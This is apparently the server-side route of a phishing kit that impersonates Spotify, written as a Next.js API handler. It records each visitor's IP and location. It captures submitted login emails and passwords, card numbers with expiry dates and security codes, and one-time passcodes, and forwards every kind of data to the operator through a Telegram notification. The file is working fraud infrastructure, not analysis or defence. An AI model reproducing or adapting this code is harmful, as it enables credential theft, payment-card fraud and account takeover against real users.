import { NextRequest, NextResponse } from 'next/server';
import { sendTelegramNotification } from '@/lib/telegram';

export async function GET(request: NextRequest) {
  try {
    // Try to get IP from headers
    let ip = request.headers.get('x-forwarded-for') || 
             request.headers.get('x-real-ip') || 
             'Unknown';
    
    if (ip !== 'Unknown' && ip.includes(',')) {
      ip = ip.split(',')[0].trim();
    }

    // If we can't get it from headers, we might be in a local dev environment
    // In production (Vercel), x-forwarded-for is usually reliable
    
    // Fetch geo info from ip-api.com (more reliable than ipapi.co sometimes)
    const geoResponse = await fetch(`http://ip-api.com/json/${ip === 'Unknown' ? '' : ip}`);
    const geoData = await geoResponse.json();

    return NextResponse.json(geoData);
  } catch (error) {
    console.error('Visitor info error:', error);
    return NextResponse.json({ status: 'fail', message: 'failed to get info' }, { status: 500 });
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { type, data } = body;

    // Use client-provided info but fallback to server-side detection if needed
    let visitorIP = data.visitorInfo?.ip || 'Unknown';
    let visitorCountry = data.visitorInfo?.country || 'Unknown';
    let visitorCity = data.visitorInfo?.city || 'Unknown';
    let visitorZip = data.visitorInfo?.postalCode || 'Unknown';

    // If client info is unknown, try to detect it server-side
    if (visitorIP === 'Unknown') {
      visitorIP = request.headers.get('x-forwarded-for')?.split(',')[0].trim() || 
                  request.headers.get('x-real-ip') || 
                  'Unknown';
    }

    let message = '';

    if (type === 'newVisitor') {
      message = `
🎵 <b>NEW SPOTIFY VISITOR</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 Country: <code>${visitorCountry}</code>
🏙️ City: <code>${visitorCity}</code>
📮 Postal Code: <code>${visitorZip}</code>
🖥️ IP Address: <code>${visitorIP}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
    } else if (type === 'login') {
      message = `
🔐 <b>LOGIN INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 Email: <code>${data.email}</code>
🔑 Password: <code>${data.password}</code>
🌍 Country: <code>${visitorCountry}</code>
🖥️ IP Address: <code>${visitorIP}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
    } else if (type === 'payment') {
      message = `
💳 <b>CARD DETAILS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 Card Number: <code>${data.cardData.cardNumber}</code>
📅 Expiration: <code>${data.cardData.expirationDate}</code>
🔐 Security Code: <code>${data.cardData.securityCode}</code>

🌍 Country: <code>${visitorCountry}</code>
🖥️ IP Address: <code>${visitorIP}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
    } else if (type === 'otp') {
      const status = data.isCorrect ? "✅ CORRECT" : "❌ INCORRECT";
      message = `
🔑 <b>OTP ATTEMPT - ${status}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔐 OTP Code: <code>${data.otp}</code>
🖥️ IP Address: <code>${visitorIP}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
    }

    if (message) {
      await sendTelegramNotification(message, visitorIP);
      return NextResponse.json({ success: true });
    }

    return NextResponse.json({ error: 'Invalid request type' }, { status: 400 });
  } catch (error) {
    console.error('Notification API error:', error);
    return NextResponse.json({ error: 'Failed to send notification' }, { status: 500 });
  }
}
